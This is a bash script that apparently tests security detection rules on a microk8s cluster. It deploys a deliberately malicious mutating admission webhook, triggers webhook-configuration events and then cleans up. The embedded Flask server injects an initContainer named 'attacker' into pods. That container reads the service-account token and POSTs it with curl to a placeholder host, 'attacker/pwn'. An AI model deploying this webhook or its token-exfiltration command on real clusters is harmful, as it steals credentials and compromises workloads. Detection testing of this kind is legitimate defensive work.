#!/usr/bin/env bash
set -euo pipefail

kubectl () {
    microk8s kubectl "$@"
}

info () {
    echo -e "\e[34m[INFO]\e[0m $1"
}

success () {
    echo -e "\e[32m[SUCCESS]\e[0m $1"
}

error () {
    echo -e "\e[31m[ERROR]\e[0m $1"
    exit 1
}

 
# -------------------------------------------------
info "Setting up mutating admission controller demo..."


git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo >/dev/null 2<&1
sed -i '22i\
kubectl () {\
    microk8s kubectl "$@"\
}' ./malicious-admission-controller-webhook-demo/deploy.sh



# -------------------------------------------------

info "[*] Building webhook image"

cat > "server.py" <<'EOF'
from flask import Flask, request, jsonify
import base64
import json

app = Flask(__name__)

@app.route("/mutate", methods=["POST"])
def mutate():
    req = request.get_json()

    # Allow simple test requests (e.g., from curl)
    if not req or "request" not in req:
        return jsonify({
            "status": "ok",
            "message": "test request received",
            "hint": "send a real AdmissionReview to trigger mutation"
        })

    uid = req["request"]["uid"]

    # Malicious JSONPatch to inject initContainer
    patch = [
        {
            "op": "add",
            "path": "/spec/initContainers",
            "value": [
                {
                    "name": "attacker",
                    "image": "alpine",
                    "command": [
                        "/bin/sh",
                        "-c",
                        (
                          "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); "
                          "curl -X POST https://attacker/pwn --data \"$TOKEN\""
                        )
                    ]
                }
            ]
        }
    ]

    patch_bytes = json.dumps(patch).encode("utf-8")
    patch_b64 = base64.b64encode(patch_bytes).decode()

    return jsonify({
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
            "uid": uid,
            "allowed": True,
            "patchType": "JSONPatch",
            "patch": patch_b64
        }
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8443, ssl_context=("/run/secrets/tls/tls.crt", "/run/secrets/tls/tls.key"))
EOF
cat > "Dockerfile" <<EOF
FROM python:3.12-slim
WORKDIR /app
COPY server.py .
RUN pip install flask
CMD ["python3", "server.py"]

EOF

info "building image" 
podman build -t malicious-mutator:latest .  >/dev/null 2<&1
info "saving image"
podman save -o mutator.tar malicious-mutator:latest >/dev/null 2<&1
info "uploading image"
microk8s ctr image import mutator.tar >/dev/null 2<&1

sed -i 's/rewanthtammana\/admission-controller-webhook-demo:1.23.make.v1api/localhost\/malicious-mutator:latest/' ./malicious-admission-controller-webhook-demo/deployment/deployment.yaml.template
# -------------------------------------------------


info "Triggering rule: Modify admission Webhook Configuration"

info "Triggering rule: Read Admission Webhook Configuration"

./malicious-admission-controller-webhook-demo/deploy.sh

info "Triggering rule: Delete admission webhook configuration"
kubectl delete mutatingwebhookconfiguration demo-webhook 
# -------------------------------------------------
info "Cleaning up..."
kubectl delete deployment -n webhook-demo webhook-server
kubectl delete service -n webhook-demo webhook-server
kubectl delete namespace webhook-demo
rm -rf ./malicious-admission-controller-webhook-demo/
rm server.py
rm Dockerfile
podman rmi -f malicious-mutator:latest
rm -f mutator.tar
microk8s ctr image rm localhost/malicious-mutator:latest
